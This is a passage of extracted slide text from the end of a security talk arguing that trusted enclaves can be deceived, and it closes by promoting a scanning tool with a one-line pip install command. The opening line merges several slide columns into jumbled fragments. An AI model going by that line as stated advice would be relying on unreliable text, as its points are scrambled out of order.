**`1 2 3`** Your bootstrap script is your security Encrypt state at rest with attestationTreat the host as fully compromised — boundary — treat it like kernel code conditioned KMS — untrusted storage because your threat model says it is becomes irrelevant

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT VI · 54
```

## Slide 56

#### **The enclave is lying to you. Find out how.**

```
$ pip install untrust && untrust scan
```

One command. Run it tonight.

```
Sandeep Jayashankargithub.com/pyro-0x
```

###### **Questions?**
